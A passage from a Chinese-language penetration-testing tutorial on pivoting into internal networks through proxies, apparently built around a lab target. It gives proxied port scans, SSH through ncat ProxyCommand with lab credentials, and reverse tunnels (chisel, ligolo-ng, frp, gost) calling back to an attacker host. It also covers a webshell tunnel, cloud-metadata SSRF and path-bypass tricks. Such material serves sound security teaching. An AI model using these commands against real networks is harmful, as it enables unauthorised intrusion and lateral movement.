+<h3 id="5-1-核心思路：返回码-端口状态"><a href="#5-1-核心思路：返回码-端口状态" class="headerlink" title="5.1 核心思路：返回码 &#x3D; 端口状态"></a>5.1 核心思路：返回码 &#x3D; 端口状态</h3><p>用代理对目标内网逐端口发起连接，根据代理的响应判断端口开闭。以 Gost 案例的 HTTP CONNECT 代理为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">P=<span class="hljs-string">&quot;http://root:123@&lt;target&gt;:1680&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> 22 80 443 3306 5432 6379 8080 9000 53000 27017; <span class="hljs-keyword">do</span><br>  out=$(curl -s -m4 -o /dev/null -w <span class="hljs-string">&quot;%&#123;http_code&#125;&quot;</span> -x <span class="hljs-string">&quot;<span class="hljs-variable">$P</span>&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:<span class="hljs-variable">$port</span>&quot;</span>)<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;port <span class="hljs-variable">$port</span> -&gt; <span class="hljs-variable">$out</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>解读返回码（HTTP CONNECT 场景）：</p>
+<table>
+<thead>
+<tr>
+<th>curl 返回</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>000</code></td>
+<td>连上了，但目标返回<strong>非 HTTP 数据</strong>（如 SSH&#x2F;MySQL banner）→ <strong>端口开放</strong></td>
+</tr>
+<tr>
+<td><code>200</code> &#x2F; <code>301</code> &#x2F; <code>404</code> 等正常 HTTP 码</td>
+<td>目标是 HTTP 服务 → <strong>端口开放</strong></td>
+</tr>
+<tr>
+<td><code>503</code> &#x2F; <code>502</code></td>
+<td>代理无法连接目标 → <strong>端口关闭&#x2F;不可达</strong></td>
+</tr>
+<tr>
+<td>超时</td>
+<td>被过滤或代理无响应</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Gost 案例正是据此发现 <code>port 22 -&gt; 000</code>（SSH banner）和 <code>port 53000 -&gt; 404</code>（gost API）。</p>
+</blockquote>
+<h3 id="5-2-proxychains-——-让任意工具走代理"><a href="#5-2-proxychains-——-让任意工具走代理" class="headerlink" title="5.2 proxychains —— 让任意工具走代理"></a>5.2 proxychains —— 让任意工具走代理</h3><p><code>proxychains4</code>（Kali 自带）通过 LD_PRELOAD 劫持 socket 调用，把几乎任何 TCP 工具的流量塞进代理。</p>
+<p>配置 <code>/etc/proxychains4.conf</code>（或自定义文件）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[ProxyList]</span><br><span class="hljs-comment"># 类型 IP 端口 [用户 密码]</span><br>http   &lt;target&gt; 1680 root 123<br><span class="hljs-comment"># 或 SOCKS5：</span><br><span class="hljs-comment"># socks5 &lt;target&gt; 1080 user pass</span><br></code></pre></td></tr></table></figure>
+
+<p>然后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 用 nmap 经代理扫内网（必须 -sT 全连接 + -Pn，不能用 SYN 扫描）</span><br>proxychains4 nmap -sT -Pn -n -p 22,80,443,3306,6379 127.0.0.1<br><br><span class="hljs-comment"># 扫整个内网段</span><br>proxychains4 nmap -sT -Pn -n -p- 10.10.10.0/24<br><br><span class="hljs-comment"># 经代理连数据库 / redis / web</span><br>proxychains4 mysql -h 127.0.0.1 -u root -p<br>proxychains4 redis-cli -h 127.0.0.1<br>proxychains4 curl http://10.10.10.5/<br></code></pre></td></tr></table></figure>
+
+<p><strong>proxychains 经 nmap 的铁律</strong>：</p>
+<ul>
+<li>必须 <code>-sT</code>（TCP 全连接），SYN&#x2F;UDP&#x2F;ICMP 扫描无法经代理。</li>
+<li>必须 <code>-Pn</code>（跳过主机发现，代理不转发 ICMP）。</li>
+<li>加 <code>-n</code> 关 DNS（或在 conf 里设 <code>proxy_dns</code>）。</li>
+<li>慢，建议缩小端口范围、调 <code>proxychains</code> 的 <code>tcp_read_time_out</code>。</li>
+</ul>
+<p><code>proxychains4.conf</code> 关键项：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini">strict_chain        <span class="hljs-comment"># 严格按顺序串联</span><br><span class="hljs-comment"># dynamic_chain     # 跳过不可用代理</span><br>proxy_dns           <span class="hljs-comment"># 远端解析 DNS（防 DNS 泄露 + 能解析内网域名）</span><br>tcp_read_time_out 8000<br>tcp_connect_time_out 5000<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-3-专用扫描器（更快）"><a href="#5-3-专用扫描器（更快）" class="headerlink" title="5.3 专用扫描器（更快）"></a>5.3 专用扫描器（更快）</h3><ul>
+<li><strong>proxychains + fscan &#x2F; kscan</strong>：内网综合扫描器，配合代理识别存活、端口、服务、弱口令。</li>
+<li><strong>dnscat &#x2F; dns 探测</strong>：在受限网络可用。</li>
+<li><strong>手写 bash&#x2F;python 扫描循环</strong>：像 5.1 那样，可控、隐蔽、依赖少。在受限靶机上往往最实用。</li>
+</ul>
+<p>通过 SOCKS5 时的 bash 扫描示例（用 ncat 探测）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> 22 80 445 3389 8080; <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">timeout</span> 3 ncat --proxy &lt;target&gt;:1080 --proxy-type socks5 127.0.0.1 <span class="hljs-variable">$p</span> &lt;/dev/null \<br>    &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$p</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$p</span> closed&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="5-4-探测什么？内网视角的优先级"><a href="#5-4-探测什么？内网视角的优先级" class="headerlink" title="5.4 探测什么？内网视角的优先级"></a>5.4 探测什么？内网视角的优先级</h3><p>经代理进入内网后，重点找：</p>
+<ol>
+<li><strong>只监听 <code>127.0.0.1</code> 的服务</strong>——这是代理的最大红利（管理后台、数据库、未授权 API、调试端口）。Gost 案例的 SSH 和 gost API 都是。</li>
+<li><strong>内网其他主机</strong>（横向）：<code>192.168.x.x</code>、<code>10.x.x.x</code>、<code>172.16-31.x.x</code>。</li>
+<li><strong>高价值服务</strong>：SSH(22)、SMB(445)、RDP(3389)、数据库(3306&#x2F;5432&#x2F;1433&#x2F;6379&#x2F;27017&#x2F;9200)、内网 Web、K8s&#x2F;Docker API、CI&#x2F;CD。</li>
+<li><strong>元数据服务</strong>（云上）：<code>169.254.169.254</code>。</li>
+</ol>
+<hr>
+<h2 id="6-SSH-穿过代理的-N-种姿势"><a href="#6-SSH-穿过代理的-N-种姿势" class="headerlink" title="6. SSH 穿过代理的 N 种姿势"></a>6. SSH 穿过代理的 N 种姿势</h2><p>Gost 案例的关键一跳是”让 SSH 走代理”。这里把所有常见做法讲全。</p>
+<h3 id="6-1-用-ncat-作-ProxyCommand（HTTP-CONNECT-代理）"><a href="#6-1-用-ncat-作-ProxyCommand（HTTP-CONNECT-代理）" class="headerlink" title="6.1 用 ncat 作 ProxyCommand（HTTP CONNECT 代理）"></a>6.1 用 ncat 作 ProxyCommand（HTTP CONNECT 代理）</h3><p>这是 Gost 案例采用的方法。<code>ssh</code> 的 <code>ProxyCommand</code> 指定一个外部程序去建立到目标的连接，<code>%h</code>&#x2F;<code>%p</code> 是目标主机&#x2F;端口占位符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o <span class="hljs-string">&quot;ProxyCommand=ncat --proxy &lt;proxy_host&gt;:&lt;proxy_port&gt; --proxy-type http \</span><br><span class="hljs-string">        --proxy-auth &lt;user&gt;:&lt;pass&gt; %h %p&quot;</span> \<br>    &lt;ssh_user&gt;@&lt;ssh_target&gt;<br></code></pre></td></tr></table></figure>
+
+<p>Gost 实例（含免交互、跳过 hostkey）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshpass -p <span class="hljs-string">&#x27;123&#x27;</span> ssh \<br>  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 \<br>  -o <span class="hljs-string">&quot;ProxyCommand=ncat --proxy 192.168.56.122:1680 --proxy-type http --proxy-auth root:123 %h %p&quot;</span> \<br>  root@127.0.0.1 <span class="hljs-string">&#x27;id&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>要点：</p>
+<ul>
+<li><code>%h %p</code> 是 <strong>SSH 最终要到达的目标</strong>（这里是靶机自己的 <code>127.0.0.1:22</code>，对代理而言就是”它本地的 22”）。</li>
+<li><code>--proxy-type</code> 可选 <code>http</code> &#x2F; <code>socks4</code> &#x2F; <code>socks5</code>。</li>
+<li>把这条命令封装成脚本（<code>/tmp/sshcmd.sh &quot;$@&quot;</code>）反复用，省事。</li>
+</ul>
+<h3 id="6-2-用-ncat-socat-作-ProxyCommand（SOCKS-代理）"><a href="#6-2-用-ncat-socat-作-ProxyCommand（SOCKS-代理）" class="headerlink" title="6.2 用 ncat &#x2F; socat 作 ProxyCommand（SOCKS 代理）"></a>6.2 用 ncat &#x2F; socat 作 ProxyCommand（SOCKS 代理）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># SOCKS5</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=ncat --proxy &lt;proxy&gt;:1080 --proxy-type socks5 %h %p&quot;</span> user@target<br><br><span class="hljs-comment"># 用 socat 走 SOCKS5（含远端 DNS）</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=socat - SOCKS4A:&lt;proxy&gt;:%h:%p,socksport=1080&quot;</span> user@target<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-3-OpenSSH-原生-ProxyCommand（无需-ncat）"><a href="#6-3-OpenSSH-原生-ProxyCommand（无需-ncat）" class="headerlink" title="6.3 OpenSSH 原生 ProxyCommand（无需 ncat）"></a>6.3 OpenSSH 原生 ProxyCommand（无需 ncat）</h3><p>新版 OpenSSH 自带代理支持：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 内置 HTTP CONNECT 代理（OpenSSH 7.3+）</span><br>ssh -o <span class="hljs-string">&quot;ProxyUseFdpass=no&quot;</span> \<br>    -o <span class="hljs-string">&quot;ProxyCommand=/usr/bin/nc -X connect -x &lt;proxy&gt;:&lt;port&gt; %h %p&quot;</span> user@target<br><br><span class="hljs-comment"># 用 -X 指定代理协议（OpenBSD nc / 部分 nc 实现）</span><br><span class="hljs-comment">#   -X connect : HTTP CONNECT</span><br><span class="hljs-comment">#   -X 5       : SOCKS5</span><br><span class="hljs-comment">#   -X 4       : SOCKS4</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=nc -X 5 -x &lt;proxy&gt;:1080 %h %p&quot;</span> user@target<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-4-ProxyJump（多级跳板）"><a href="#6-4-ProxyJump（多级跳板）" class="headerlink" title="6.4 ProxyJump（多级跳板）"></a>6.4 ProxyJump（多级跳板）</h3><p>如果代理本身是一台你已有 SSH 权限的跳板机，用 <code>-J</code> 最干净：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 经 jump1 再到 target</span><br>ssh -J user@jump1 user@target<br><span class="hljs-comment"># 多级</span><br>ssh -J user@jump1,user@jump2 user@target<br></code></pre></td></tr></table></figure>
+
+<p>写进 <code>~/.ssh/config</code> 更舒服：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sshconfig">Host target<br>    HostName 10.10.10.50<br>    User admin<br>    ProxyJump bastion<br><br>Host bastion<br>    HostName 192.168.56.122<br>    User root<br>    # 经第三方代理软件再连 bastion<br>    ProxyCommand ncat --proxy 1.2.3.4:1080 --proxy-type socks5 %h %p<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-5-经-proxychains-连-SSH"><a href="#6-5-经-proxychains-连-SSH" class="headerlink" title="6.5 经 proxychains 连 SSH"></a>6.5 经 proxychains 连 SSH</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 ssh user@127.0.0.1<br></code></pre></td></tr></table></figure>
+
+<p>简单粗暴，但交互式 shell 下 proxychains 偶有兼容问题，重要场景更推荐 ProxyCommand。</p>
+<h3 id="6-6-拿到-SSH-后反向把内网”拉出来”"><a href="#6-6-拿到-SSH-后反向把内网”拉出来”" class="headerlink" title="6.6 拿到 SSH 后反向把内网”拉出来”"></a>6.6 拿到 SSH 后反向把内网”拉出来”</h3><p>一旦 SSH 进去了，SSH 本身就是最好的隧道工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 动态 SOCKS（本地 1080 → 经 target 访问 target 的整个可见网络）</span><br>ssh -D 1080 -N -f user@target<br><span class="hljs-comment"># 之后本地：proxychains4 / curl --socks5 127.0.0.1:1080 任意访问内网</span><br><br><span class="hljs-comment"># 本地端口转发：把 target 的内网 redis 映射到本地</span><br>ssh -L 6379:10.10.10.9:6379 -N user@target<br><br><span class="hljs-comment"># 远程端口转发：把本地服务送进内网</span><br>ssh -R 8000:127.0.0.1:8000 -N user@target<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Gost 案例里，进了 SSH 后可立刻 <code>ssh -D</code> 把靶机的整个内网视角”接管”到本地。</p>
+</blockquote>
+<hr>
+<h2 id="7-从单点代理到完整内网隧道"><a href="#7-从单点代理到完整内网隧道" class="headerlink" title="7. 从单点代理到完整内网隧道"></a>7. 从单点代理到完整内网隧道</h2><p>当目标只给你一个 webshell 或一个受限端口时，需要<strong>自己搭隧道</strong>把内网拉出来。下面是主流工具，按场景选。</p>
+<h3 id="7-1-chisel（最常用，TCP-UDP-over-HTTP）"><a href="#7-1-chisel（最常用，TCP-UDP-over-HTTP）" class="headerlink" title="7.1 chisel（最常用，TCP&#x2F;UDP over HTTP）"></a>7.1 chisel（最常用，TCP&#x2F;UDP over HTTP）</h3><p>单文件 Go 程序，攻击机做 server，目标做 client，反向把目标内网映射出来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 攻击机（server，反向模式）</span><br>./chisel server -p 8080 --reverse<br><br><span class="hljs-comment"># 目标机（client）：把自己的内网通过 SOCKS 暴露给攻击机的 1080</span><br>./chisel client &lt;attacker&gt;:8080 R:1080:socks<br><br><span class="hljs-comment"># 攻击机现在用 SOCKS5 127.0.0.1:1080 访问目标内网</span><br>proxychains4 nmap -sT -Pn 10.10.10.0/24<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-2-ligolo-ng（体验最好，免-proxychains）"><a href="#7-2-ligolo-ng（体验最好，免-proxychains）" class="headerlink" title="7.2 ligolo-ng（体验最好，免 proxychains）"></a>7.2 ligolo-ng（体验最好，免 proxychains）</h3><p>通过创建虚拟网卡，把内网网段当成本地路由，无需 proxychains，nmap 可正常 SYN 扫描。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 攻击机（proxy/agent 服务端）</span><br>./proxy -selfcert<br><span class="hljs-comment"># 目标机（agent）</span><br>./agent -connect &lt;attacker&gt;:11601 -ignore-cert<br><span class="hljs-comment"># 在 ligolo 控制台 start 后，添加路由：</span><br><span class="hljs-comment">#   ip route add 10.10.10.0/24 dev ligolo</span><br><span class="hljs-comment"># 之后直接 nmap/curl 10.10.10.x，像本地一样</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-3-frp（功能全面的内网穿透）"><a href="#7-3-frp（功能全面的内网穿透）" class="headerlink" title="7.3 frp（功能全面的内网穿透）"></a>7.3 frp（功能全面的内网穿透）</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frps.ini（攻击机/公网）</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-comment"># frpc.ini（目标机）</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = &lt;attacker&gt;<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-4-reGeorg-Neo-reGeorg（只有-webshell-时）"><a href="#7-4-reGeorg-Neo-reGeorg（只有-webshell-时）" class="headerlink" title="7.4 reGeorg &#x2F; Neo-reGeorg（只有 webshell 时）"></a>7.4 reGeorg &#x2F; Neo-reGeorg（只有 webshell 时）</h3><p>把 SOCKS 代理隧道封装进 HTTP 请求，借一个上传的脚本（php&#x2F;jsp&#x2F;aspx）穿透。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 目标：上传 tunnel.php（webshell 隧道端点）</span><br><span class="hljs-comment"># 攻击机：</span><br>python3 neoreg.py -k &lt;key&gt; -u http://victim/tunnel.php<br><span class="hljs-comment"># 本地起 SOCKS5 :1080，proxychains 走它</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-5-Metasploit-内置-pivot"><a href="#7-5-Metasploit-内置-pivot" class="headerlink" title="7.5 Metasploit 内置 pivot"></a>7.5 Metasploit 内置 pivot</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># meterpreter 会话里加路由</span><br><span class="hljs-built_in">run</span> autoroute -s 10.10.10.0/24<br><span class="hljs-comment"># 起 SOCKS 代理</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">set</span> SRVPORT 1080 ; <span class="hljs-built_in">set</span> VERSION 5 ; <span class="hljs-built_in">run</span><br><span class="hljs-comment"># msf 外部用 proxychains 走 1080</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-6-gost（本案例的”主角”，也可你自己用）"><a href="#7-6-gost（本案例的”主角”，也可你自己用）" class="headerlink" title="7.6 gost（本案例的”主角”，也可你自己用）"></a>7.6 gost（本案例的”主角”，也可你自己用）</h3><p>gost 本身就是强大的隧道工具，可正向可反向、多协议：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在目标起一个 SOCKS5（如果你能执行命令）</span><br>gost -L socks5://:1080<br><br><span class="hljs-comment"># 反向：目标主动连回攻击机，建立隧道</span><br><span class="hljs-comment"># 攻击机：</span><br>gost -L rtcp://:1080/127.0.0.1:1080 -L socks5://:1080<br><span class="hljs-comment"># 目标：</span><br>gost -L socks5://:0 -F forward+ws://&lt;attacker&gt;:443<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-7-工具选型速查"><a href="#7-7-工具选型速查" class="headerlink" title="7.7 工具选型速查"></a>7.7 工具选型速查</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标能跑二进制、要稳要快</td>
+<td><strong>ligolo-ng</strong> &gt; chisel</td>
+</tr>
+<tr>
+<td>只有 webshell</td>
+<td>Neo-reGeorg</td>
+</tr>
+<tr>
+<td>已有 SSH</td>
+<td><code>ssh -D</code> &#x2F; ProxyJump（零额外工具）</td>
+</tr>
+<tr>
+<td>已有 meterpreter</td>
+<td>autoroute + socks_proxy</td>
+</tr>
+<tr>
+<td>需要长期、多端口、UDP</td>
+<td>frp &#x2F; gost</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="8-按软件分类的实战应对手册"><a href="#8-按软件分类的实战应对手册" class="headerlink" title="8. 按软件分类的实战应对手册"></a>8. 按软件分类的实战应对手册</h2><p>遇到具体代理软件时的针对性打法。</p>
+<h3 id="8-1-Squid（HTTP-HTTPS-代理，常见-3128）"><a href="#8-1-Squid（HTTP-HTTPS-代理，常见-3128）" class="headerlink" title="8.1 Squid（HTTP&#x2F;HTTPS 代理，常见 3128）"></a>8.1 Squid（HTTP&#x2F;HTTPS 代理，常见 3128）</h3><ul>
+<li><strong>未授权开放</strong>：直接 <code>curl -x http://target:3128 http://internal/</code> 探内网；测 CONNECT 能否隧穿。</li>
+<li><strong>看 ACL 绕过</strong>：Squid 常配 ACL 限制可达目标，尝试不同 Host、IP 写法（<code>http://127.0.0.1</code>、<code>http://[::1]</code>、十进制 IP、<code>http://internal.local</code>）。</li>
+<li><strong>配置泄露</strong>：<code>/etc/squid/squid.conf</code> 里常有内网网段、上游代理、缓存目录线索。</li>
+<li><strong>缓存投毒 &#x2F; SSRF</strong>：开放代理本身就是 SSRF 跳板，可打云元数据、内网 web。</li>
+</ul>
+<h3 id="8-2-SOCKS5（Dante-ss-各类）"><a href="#8-2-SOCKS5（Dante-ss-各类）" class="headerlink" title="8.2 SOCKS5（Dante &#x2F; ss &#x2F; 各类）"></a>8.2 SOCKS5（Dante &#x2F; ss &#x2F; 各类）</h3><ul>
+<li>用 <code>curl --socks5-hostname</code>、<code>proxychains</code>（<code>socks5</code>）直接接入。</li>
+<li>SOCKS5 支持 UDP——可做 DNS、部分协议的转发。</li>
+<li>无认证的 SOCKS5 是横向的高速公路，立即拿来扫内网。</li>
+</ul>
+<h3 id="8-3-gost（多协议-auto，本案例）"><a href="#8-3-gost（多协议-auto，本案例）" class="headerlink" title="8.3 gost（多协议 &#x2F; auto，本案例）"></a>8.3 gost（多协议 &#x2F; auto，本案例）</h3><ul>
+<li><code>auto</code> 模式下 HTTP&#x2F;SOCKS 都试。</li>
+<li>认证多为 Basic 或 <code>-L user:pass@</code>，<strong>优先找配置&#x2F;进程里的明文凭据</strong>。</li>
+<li>注意它常伴随 <code>-api</code>（管理 API，可能在 <code>127.0.0.1</code>，经代理自己能访问到——可读配置甚至改服务）和 <code>-metrics</code>（Prometheus，泄露客户端 IP、流量、内网拓扑线索）。Gost 案例的 <code>9000/metrics</code> 就泄露了客户端 <code>192.168.56.104</code>。</li>
+</ul>
+<h3 id="8-4-frp-chisel-ngrok（隧道工具，多为目标遗留或被你利用）"><a href="#8-4-frp-chisel-ngrok（隧道工具，多为目标遗留或被你利用）" class="headerlink" title="8.4 frp &#x2F; chisel &#x2F; ngrok（隧道工具，多为目标遗留或被你利用）"></a>8.4 frp &#x2F; chisel &#x2F; ngrok（隧道工具，多为目标遗留或被你利用）</h3><ul>
+<li>发现目标已在跑 frpc&#x2F;chisel，说明<strong>内网已被某条隧道打通</strong>，找它的配置（server 地址、token、映射端口）可顺藤摸瓜。</li>
+<li>ngrok：留意 <code>ngrok</code> 进程和 <code>~/.ngrok2/ngrok.yml</code>，authtoken 可能泄露。</li>
+</ul>
+<h3 id="8-5-nginx-HAProxy-Traefik（反向代理，攻击面视角）"><a href="#8-5-nginx-HAProxy-Traefik（反向代理，攻击面视角）" class="headerlink" title="8.5 nginx &#x2F; HAProxy &#x2F; Traefik（反向代理，攻击面视角）"></a>8.5 nginx &#x2F; HAProxy &#x2F; Traefik（反向代理，攻击面视角）</h3><ul>
+<li><strong>SSRF &#x2F; 路由绕过</strong>：构造特殊路径、Host 头、<code>X-Forwarded-*</code>，访问被代理隐藏的内部服务（<code>/internal/</code>、<code>/admin/</code>、actuator 端点）。</li>
+<li><strong>路径规范化差异</strong>：<code>/..;/</code>、<code>%2e%2e</code>、双重编码绕过 location 限制。</li>
+<li><strong>暴露内部 upstream</strong>：错误配置会把内网服务直接代理出来。</li>
+</ul>
+<h3 id="8-6-Tor-Clash-等客户端代理"><a href="#8-6-Tor-Clash-等客户端代理" class="headerlink" title="8.6 Tor &#x2F; Clash 等客户端代理"></a>8.6 Tor &#x2F; Clash 等客户端代理</h3><ul>
+<li>渗透中遇到（如目标机装了）通常是出网通道线索，或可借其匿名性——但更多是取证&#x2F;溯源相关，本文不展开。</li>
+</ul>
+<hr>
+<h2 id="9-常见返回码、报错与排查"><a href="#9-常见返回码、报错与排查" class="headerlink" title="9. 常见返回码、报错与排查"></a>9. 常见返回码、报错与排查</h2><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>含义 &#x2F; 处理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>407 Proxy Authentication Required</code></td>
+<td>代理需要认证 → 找凭据 &#x2F; 爆破</td>
+</tr>
+<tr>
+<td><code>HTTP/1.1 200 Connection established</code></td>
+<td>CONNECT 隧道建好了 → 可上 SSH 等</td>
+</tr>
+<tr>
+<td>curl <code>-w %&#123;http_code&#125;</code> 返回 <code>000</code></td>
+<td>连上但非 HTTP 响应（banner）→ 端口很可能开放</td>
+</tr>
+<tr>
+<td><code>502 / 503</code></td>
+<td>代理连不上目标 → 端口关闭 &#x2F; ACL 拦截</td>
+</tr>
+<tr>
+<td><code>ncat: Proxy authentication failed</code></td>
+<td>凭据错或格式错（注意 <code>--proxy-auth user:pass</code>）</td>
+</tr>
+<tr>
+<td>SSH <code>Connection closed by remote</code> 经代理</td>
+<td>目标 22 其实没开 &#x2F; ACL 限制 CONNECT 目标</td>
+</tr>
+<tr>
+<td>proxychains nmap 全显示 open&#x2F;filtered</td>
+<td>没加 <code>-sT -Pn</code>，或代理不支持该流量</td>
+</tr>
+<tr>
+<td>DNS 泄露 &#x2F; 解析失败</td>
+<td>开 <code>proxy_dns</code>，或用 <code>--socks5-hostname</code> 远端解析</td>
+</tr>
+<tr>
+<td>速度极慢</td>
+<td>proxychains 串联固有开销；缩小端口、调超时、改用 ligolo</td>
+</tr>
+</tbody></table>
+<p><strong>通用排查顺序</strong>：</p>
+<ol>
+<li>代理本身通不通？<code>curl -v -x ... http://一个已知外网</code>。</li>
+<li>协议对不对？HTTP &#x2F; SOCKS4 &#x2F; SOCKS5 逐个试。</li>
+<li>认证对不对？看 407 &#x2F; 握手失败。</li>
+<li>目标端口对代理可达吗？先 CONNECT&#x2F;扫一遍。</li>
+<li>工具兼容吗？ProxyCommand 比 proxychains 更稳。</li>
+</ol>
+<hr>
+<h2 id="10-防御与检测视角"><a href="#10-防御与检测视角" class="headerlink" title="10. 防御与检测视角"></a>10. 防御与检测视角</h2><p>红队要懂蓝队，才能更隐蔽，也能写出有价值的修复建议。回到 Gost 案例的教训：</p>
+<p><strong>为什么代理成了致命入口？</strong></p>
+<ol>
